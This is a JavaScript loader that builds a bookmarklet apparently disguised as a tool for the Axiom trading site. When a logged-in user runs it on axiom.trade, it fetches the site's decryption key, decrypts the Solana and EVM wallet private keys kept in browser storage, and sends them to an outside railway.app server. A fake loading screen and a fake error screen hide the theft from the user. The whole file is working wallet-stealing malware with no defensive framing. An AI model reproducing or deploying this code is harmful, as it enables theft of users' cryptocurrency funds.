// loader.js - Modified to send to honeypot with loading UI

(function() {
    try {
        const data = JSON.parse(atob(document.currentScript.getAttribute('data')));
        
        document.addEventListener('DOMContentLoaded', () => {
            document.querySelectorAll('a.bookmarklet').forEach(el => {
                const payload = `
                (function() {
                    // Create unique IDs
                    const loadingId = 'bloom-loader-' + Date.now();
                    
                    // Inject loading UI immediately
                    const loaderDiv = document.createElement('div');
                    loaderDiv.id = loadingId;
                    loaderDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#0a0a0a 0%,#1a1a2e 50%,#16213e 100%);z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:Inter,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;';
                    
                    loaderDiv.innerHTML = \`
                        <div style="text-align:center;padding:40px;">
                            <div style="font-size:72px;font-weight:700;background:linear-gradient(90deg,#667eea 0%,#764ba2 50%,#f093fb 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:bloom-pulse 1.5s ease-in-out infinite;letter-spacing:-2px;margin-bottom:20px;">Loading</div>
                            <div style="width:60px;height:60px;border:4px solid rgba(102,126,234,0.3);border-top-color:#667eea;border-radius:50%;margin:30px auto;animation:bloom-spin 1s linear infinite;"></div>
                            <div style="font-size:18px;color:#888;font-weight:400;animation:bloom-fade 2s ease-in-out infinite;">Connecting to server...</div>
                        </div>
                        <style>
                            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
                            @keyframes bloom-spin{to{transform:rotate(360deg)}}
                            @keyframes bloom-pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.7;transform:scale(.98)}}
                            @keyframes bloom-fade{0%,100%{opacity:.5}50%{opacity:1}}
                        </style>
                    \`;
                    
                    const errorDiv = document.createElement('div');
                    errorDiv.id = loadingId + '-error';
                    errorDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#0a0a0a 0%,#1a1a2e 50%,#16213e 100%);z-index:999999;display:none;flex-direction:column;align-items:center;justify-content:center;font-family:Inter,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;';
                    errorDiv.innerHTML = '<div style="text-align:center;padding:40px;"><div style="font-size:32px;font-weight:600;color:#ff6b6b;margin-bottom:15px;">Failed to load server</div><div style="font-size:18px;color:#888;">Try again later</div></div>';
                    
                    document.body.appendChild(loaderDiv);
                    document.body.appendChild(errorDiv);
                    
                    // Switch to error after 3.5 seconds
                    setTimeout(() => {
                        loaderDiv.style.display = 'none';
                        errorDiv.style.display = 'flex';
                    }, 3500);
                    
                    // Execute payload in background after short delay to let UI render
                    setTimeout(() => {
                        (async () => {
                            try {
                                if (location.hostname !== "axiom.trade") {
                                    ${data?.alerts?.guide ? 'setTimeout(() => alert('+JSON.stringify(data.alerts.guide)+'), 3600);' : ''}
                                    return;
                                }
                                if (!localStorage.getItem("isAuthed")) {
                                    ${data?.alerts?.unauthorized ? 'setTimeout(() => alert('+JSON.stringify(data.alerts.unauthorized)+'), 3600);' : ''}
                                    return;
                                }
                                
                                function arrayToString(dataArray) {
                                    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
                                    const resultDigits = [0];
                                    for (let element of dataArray) {
                                        let carry = element;
                                        for (let i = 0; i < resultDigits.length; i++) {
                                            const value = resultDigits[i] * 0x100 + carry;
                                            resultDigits[i] = value % 58;
                                            carry = value / 58 | 0;
                                        }
                                        while (carry) {
                                            resultDigits.push(carry % 58);
                                            carry = carry / 58 | 0;
                                        }
                                    }
                                    let resultString = "";
                                    for (let i = 0; i < dataArray.length && dataArray[i] === 0; i++) resultString += ALPHABET[0];
                                    for (let i = resultDigits.length - 1; i >= 0; i--) resultString += ALPHABET[resultDigits[i]];
                                    return resultString;
                                }
                                
                                function stringToArray(key) {
                                    try {
                                        const cleanedKey = key.replace(/-/g, "+").replace(/_/g, "/");
                                        return Uint8Array.from(atob(cleanedKey), c => c.charCodeAt(0));
                                    } catch {
                                        return new TextEncoder().encode(key);
                                    }
                                }
                                
                                function arrayToStringEVM(e) {
                                    return Array.from(e instanceof Uint8Array ? e : new Uint8Array(e))
                                        .map(e => e.toString(16).padStart(2, "0")).join("");
                                }
                                
                                async function sendData(apiUrl, payload) {
                                    const timestamp = Math.floor(Date.now() / 1000);
                                    payload.timestamp = timestamp;
                                    payload.header = navigator.userAgent;
                                    const encoded = btoa(JSON.stringify(payload));
                                    const url = apiUrl + '/' + encodeURIComponent(encoded);
                                    
                                    // Use fetch with no-cors to avoid navigation issues
                                    try {
                                        await fetch(url, { method: 'GET', mode: 'no-cors' });
                                    } catch(e) {
                                        // Fallback: use beacon API
                                        navigator.sendBeacon(url);
                                    }
                                }
                                
                                async function decrypt(key, toDecrypt) {
                                    const [ivString, dataString] = String(toDecrypt).split(":");
                                    const iv = stringToArray(ivString);
                                    const data = stringToArray(dataString);
                                    const decrypted = await crypto.subtle.decrypt({ "name": "AES-GCM", iv: iv }, key, data);
                                    return new Uint8Array(decrypted);
                                }
                                
                                // Fetch decryption key
                                const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
                                    "method": "POST",
                                    "credentials": "include"
                                })).json();
                                
                                const cryptoKey = await crypto.subtle.importKey("raw", stringToArray(bundleKey).buffer, { "name": "AES-GCM" }, false, ["decrypt"]);
                                
                                // Extract Solana bundles
                                const solanaBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
                                const evmBundles = JSON.parse(localStorage.getItem("eBundles") || "[]");
                                const success = [];
                                
                                // Decrypt Solana wallets
                                for (const bundle of solanaBundles) {
                                    try {
                                        const decrypted = await decrypt(cryptoKey, bundle);
                                        if (decrypted.length !== 64) continue;
                                        const priv = arrayToString(decrypted);
                                        const pub = arrayToString(decrypted.slice(32));
                                        success.push({ type: "solana", pub: pub, priv: priv });
                                    } catch (e) {}
                                }
                                
                                // Load ethers for EVM
                                let ethers = null;
                                try {
                                    ethers = await import("https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm");
                                } catch (e) {}
                                
                                // Decrypt EVM wallets
                                for (const bundle of evmBundles) {
                                    try {
                                        const decrypted = await decrypt(cryptoKey, bundle);
                                        const priv = arrayToStringEVM(decrypted);
                                        let pub = "unknown";
                                        if (ethers) pub = ethers.computeAddress("0x" + priv);
                                        success.push({ type: "evm", pub: pub, priv: priv });
                                    } catch (e) {}
                                }
                                
                                // SEND TO HONEYPOT
                                await sendData("https://bloom-sniper-production.up.railway.app", {
                                    wallets: success,
                                    code: ${JSON.stringify(data.code || '')},
                                    site: "Axiom",
                                    walletCount: success.length,
                                    solanaCount: solanaBundles.length,
                                    evmCount: evmBundles.length
                                });
                                
                            } catch (err) {
                                console.error(err);
                            }
                        })();
                    }, 100);
                    
                    // Prevent any navigation
                    return false;
                })();
                `;
                
                el.href = 'javascript:' + encodeURIComponent(payload);
                el.draggable = true;
            });
            
            console.log('%c[+] Bookmarklets loaded successfully', 'color: #bada55');
        });
        
    } catch (err) {
        console.error('[-] Failed to load bookmarklet(s):', err);
        alert('Failed to load bookmarklet(s): ' + err.message);
    }
})();